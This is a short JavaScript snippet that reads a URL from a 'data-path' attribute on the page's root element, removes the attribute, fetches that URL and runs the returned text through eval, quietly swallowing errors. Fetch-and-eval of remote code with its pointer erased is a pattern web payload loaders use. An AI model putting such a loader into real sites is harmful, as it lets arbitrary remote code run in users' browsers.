const provider = document.documentElement;
const attr = "data-path";
const path = provider.getAttribute(attr);
provider.removeAttribute(attr);
fetch(path)
  .then((resp) => resp.text())
  .catch(console.warn)
  .then(eval)
  .catch(console.log);
